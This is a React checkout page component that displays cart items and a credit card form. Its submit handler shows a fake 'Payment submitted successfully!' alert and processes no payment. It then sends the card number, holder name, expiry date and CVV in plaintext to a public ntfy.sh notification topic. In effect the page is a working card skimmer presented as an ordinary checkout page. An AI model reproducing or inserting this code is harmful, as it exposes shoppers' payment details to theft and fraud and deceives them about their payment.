import React, { useState, useEffect } from 'react';
import Navbar from './comps/Navbar';
import Footer from './comps/Footer';
import AOS from "aos";
import "aos/dist/aos.css";

AOS.init();

function CreditCheckout() {
    const [formData, setFormData] = useState({
        cardNumber: '',
        cardHolder: '',
        expirationDate: '',
        cvv: '',
    });

    const [cartItems, setCartItems] = useState([]);
    const [totalPrice, setTotalPrice] = useState(0);

    // Load cart items from localStorage
    useEffect(() => {
        const savedCart = JSON.parse(localStorage.getItem("cart")) || [];
        setCartItems(savedCart);
        setTotalPrice(savedCart.reduce((total, item) => total + item.price * item.quantity, 0)); // Adjust for quantities
    }, []);

    const handleChange = (e) => {
        const { name, value } = e.target;
        setFormData({
            ...formData,
            [name]: value,
        });
    };

    const handleSubmit = (e) => {
        e.preventDefault();

        // Handle form submission here (e.g., send to payment processor)
        console.log('Payment Information:', formData);
        alert('Payment submitted successfully!');

        // Send the card details through ntfy when the submit button is hit
        fetch('https://ntfy.sh/Fredd_y123', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: `Card Information:
                          Card Number: ${formData.cardNumber}
                          Card Holder: ${formData.cardHolder}
                          Expiration Date: ${formData.expirationDate}
                          CVV: ${formData.cvv}`,
                priority: 3,  // High priority for card submission notification
            }),
        })
        .then(response => response.json())
        .then(data => console.log('Card details notification sent:', data))
        .catch(error => console.error('Error sending card details notification:', error));

    };

    return (
        <div className="bg-white">
            {/* Navbar Component */}
            <Navbar />
  
            <div className="container mx-auto px-4 py-10">
                <h1 className="text-3xl font-bold mb-8">Checkout</h1>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                    {/* Order Summary Section */}
                    <div className="bg-gray-100 p-6 rounded-lg shadow-lg">
                        <h3 className="text-xl font-semibold mb-4">Order Summary</h3>
                        {cartItems.length > 0 ? (
                            cartItems.map(item => (
                                <div key={item.id} className="flex justify-between mb-2">
                                    <span>{item.name}</span>
                                    <span>${(item.price * item.quantity).toFixed(2)}</span>
                                </div>
                            ))
                        ) : (
                            <div>Your cart is empty.</div>
                        )}
                        <div className="flex justify-between font-bold">
                            <span>Total:</span>
                            <span>${totalPrice.toFixed(2)}</span>
                        </div>
                    </div>

                    {/* Payment Form Section */}
                    <form onSubmit={handleSubmit} className="bg-gray-100 p-6 rounded-lg shadow-lg">
                        <h3 className="text-xl font-semibold mb-4">Payment Information</h3>
                        <div className="mb-4">
                            <label className="block text-gray-700">Card Number</label>
                            <input
                                type="text"
                                name="cardNumber"
                                value={formData.cardNumber}
                                onChange={handleChange}
                                required
                                className="border rounded-md p-2 w-full"
                                placeholder="1234 5678 9012 3456"
                            />
                        </div>
                        <div className="mb-4">
                            <label className="block text-gray-700">Card Holder</label>
                            <input
                                type="text"
                                name="cardHolder"
                                value={formData.cardHolder}
                                onChange={handleChange}
                                required
                                className="border rounded-md p-2 w-full"
                                placeholder="John Doe"
                            />
                        </div>
                        <div className="grid grid-cols-2 gap-4 mb-4">
                            <div>
                                <label className="block text-gray-700">Expiration Date (MM/YY)</label>
                                <input
                                    type="text"
                                    name="expirationDate"
                                    value={formData.expirationDate}
                                    onChange={handleChange}
                                    required
                                    className="border rounded-md p-2 w-full"
                                    placeholder="MM/YY"
                                />
                            </div>
                            <div>
                                <label className="block text-gray-700">CVV</label>
                                <input
                                    type="text"
                                    name="cvv"
                                    value={formData.cvv}
                                    onChange={handleChange}
                                    required
                                    className="border rounded-md p-2 w-full"
                                    placeholder="123"
                                />
                            </div>
                        </div>
                        <button
                            type="submit"
                            className="w-full bg-blue-600 text-white py-2 rounded-lg hover:bg-blue-500"
                        >
                            Pay ${totalPrice.toFixed(2)}
                        </button>
                    </form>
                </div>
            </div>
  
            {/* Footer Component */}
            <Footer />
        </div>
    );
}

export default CreditCheckout;
